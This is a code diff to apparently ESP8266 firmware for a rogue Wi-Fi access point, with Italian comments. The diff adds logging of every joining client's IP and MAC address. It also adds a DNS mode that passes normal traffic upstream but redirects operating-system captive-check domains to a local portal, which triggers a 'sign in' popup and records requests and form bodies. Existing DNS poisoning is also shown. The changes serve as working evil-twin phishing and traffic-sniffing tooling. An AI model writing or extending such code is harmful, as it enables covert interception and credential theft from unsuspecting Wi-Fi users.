@@ -102,12 +102,32 @@ struct DnsPending {
 DnsPending dnsTab[8];
 
 bool naptInitDone = false;
+uint32_t dnsCount = 0;
+uint32_t httpCount = 0;
 
 void sniffPush(const String &s) {
   for (int k = 0; k < sniffCount; k++) if (sniffLog[k] == s) return;
   if (sniffCount < 20) { sniffLog[sniffCount++] = s; return; }
   for (int k = 1; k < 20; k++) sniffLog[k - 1] = sniffLog[k];
   sniffLog[19] = s;
+}
+
+// client che si aggancia all'AP: lo logghiamo come "C:<ip>" anche senza traffico
+void joinTick() {
+  if (!rogue) return;
+  static uint32_t last = 0;
+  if (millis() - last < 3000) return;
+  last = millis();
+  struct station_info *st = wifi_softap_get_station_info();
+  for (struct station_info *s = st; s; s = STAILQ_NEXT(s, next)) {
+    IPAddress ip((uint8_t)(s->ip.addr & 0xFF), (uint8_t)((s->ip.addr >> 8) & 0xFF),
+                 (uint8_t)((s->ip.addr >> 16) & 0xFF), (uint8_t)((s->ip.addr >> 24) & 0xFF));
+    char mac[18];
+    snprintf(mac, sizeof(mac), "%02X:%02X:%02X:%02X:%02X:%02X",
+             s->bssid[0], s->bssid[1], s->bssid[2], s->bssid[3], s->bssid[4], s->bssid[5]);
+    sniffPush("C:" + ip.toString() + " " + mac);
+  }
+  wifi_softap_free_station_info();
 }
 
 WiFiUDP dnsSrv;
@@ -168,6 +188,8 @@ uint8_t crc8(const uint8_t *d, int n) {
 
 // ============ TX con buffer offline ============
 void sendFrame(uint8_t cmdEcho, uint8_t status, const uint8_t *payload, int len) {
+  if (len < 0) len = 0;
+  if (len > 1000) len = 1000;      // clamp PRIMA dell'header: il CRC deve coprire len reale
   uint8_t f[1024];
   int i = 0;
   f[i++] = 0x5A;
@@ -175,8 +197,7 @@ void sendFrame(uint8_t cmdEcho, uint8_t status, const uint8_t *payload, int len)
   f[i++] = (len >> 8) & 0xFF;
   f[i++] = cmdEcho;
   f[i++] = status;
-  if (len > 1000) len = 1000;
-  if (len > 0) { memcpy(f + i, payload, len); i += len; }
+  if (len > 0 && payload) { memcpy(f + i, payload, len); i += len; }
   f[i++] = crc8(f + 1, 4 + len);
 
   if (client && client.connected()) {
@@ -372,10 +393,23 @@ void feedRx(const uint8_t *d, int n) {
   }
 }
 
-// ============ DNS: log di tutti i domini + portal in modalità poison ============
-// Modalità HYBRID (dnsFwd=1): repeater trasparente — tutto inoltrato upstream, i
-// domini finiscono nel log sniff. Niente popup captive (iOS vede internet reale).
-// Modalità POISON (dnsFwd=0): ogni dominio → IP del softAP, così parte il portal.
+// ============ DNS: log di tutti i domini + captive-check al portal ============
+// FORWARD (dnsFwd=1) = ibrido: tutto inoltrato upstream (internet reale), i domini
+// finiscono nel log, e SOLO i captive-check vanno al portal → popup "Accedi alla
+// rete" + internet funzionante. POISON (dnsFwd=0) = ogni dominio → portal.
+bool isCaptiveHost(const String &h) {
+  static const char *hosts[] = {
+    "captive.apple.com", "captive.gstatic.com", "connectivitycheck.gstatic.com",
+    "connectivitycheck.android.com", "clients3.google.com", "clients4.google.com",
+    "detectportal.firefox.com", "nmcheck.gnome.org", "msftconnecttest.com",
+    "msftncsi.com", "networkcheck.kde.org", "wifi.google.com"
+  };
+  for (unsigned i = 0; i < sizeof(hosts) / sizeof(hosts[0]); i++) {
+    if (h == hosts[i] || h.endsWith(String(".") + hosts[i])) return true;
+  }
+  return false;
+}
+
 void dnsPoison(uint8_t *q, int n, const IPAddress &cip, const IPAddress &client, uint16_t cport) {
   if (n + 16 > 512) return;
   q[2] = 0x81; q[3] = 0x80;         // QR=1, RD+RA
@@ -434,9 +468,11 @@ void dnsTick() {
     qn.remove(qn.length() - 1);
     sniffPush("D:" + qn);
   }
+  dnsCount++;
 
-  // hybrid: DNS upstream + log; poison: tutto → portal sull'AP
-  if (!dnsFwd) {
+  // FORWARD = ibrido: captive-check → portal, tutto il resto → DNS upstream.
+  // POISON = tutto al portal.
+  if (!dnsFwd || isCaptiveHost(qn)) {
     dnsPoison(q, n, WiFi.softAPIP(), cip, cport);
     return;
   }
@@ -498,6 +534,7 @@ void portalTick() {
   String entry = method + " http://" + host + path;
   if (body.length() > 0 && body.length() < 300) entry += "  [" + body + "]";
   sniffPush("H:" + entry);
+  httpCount++;
   Serial.printf("[portal] %s\n", entry.c_str());
 
   String page = (portalLen > 0) ? String(portalPage) :
@@ -761,7 +798,7 @@ void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
       // FIX #7: NAPT (init tabelle + enable) solo se STA è up
       naptOn();
       Serial.printf("[rogue] %s ch%d dns=%s napt=1 portal=%s\n", rogueSsid, apChannel,
-                    dnsFwd ? "forward" : "poison", dnsFwd ? "off" : "all");
+                    dnsFwd ? "hybrid(forward+captive)" : "poison", dnsFwd ? "captive-only" : "all");
       sendFrame(0x13, 0x00, nullptr, 0);
       break;
     }
@@ -857,6 +894,16 @@ void dispatchCmd(uint8_t cmd, const uint8_t *pl, int plen) {
         if (k) csv += "|";
         csv += sniffLog[k];
       }
+      if (csv.length() == 0) {
+        struct station_info *st = wifi_softap_get_station_info();
+        int cl = 0;
+        for (struct station_info *s = st; s; s = STAILQ_NEXT(s, next)) cl++;
+        wifi_softap_free_station_info();
+        char diag[80];
+        snprintf(diag, sizeof(diag), "# idle dns=%lu http=%lu clients=%d rogue=%d",
+                 (unsigned long)dnsCount, (unsigned long)httpCount, cl, rogue ? 1 : 0);
+        csv = diag;
+      }
       sendFrame(0x19, 0x00, (const uint8_t *)csv.c_str(), csv.length());
       break;
     }
@@ -938,6 +985,7 @@ void loop() {
   pollScan();
   dnsTick();
   portalTick();
+  joinTick();
 
   if (joinPending) {
     if (WiFi.status() == WL_CONNECTED && WiFi.SSID() == joinTargetSsid) {
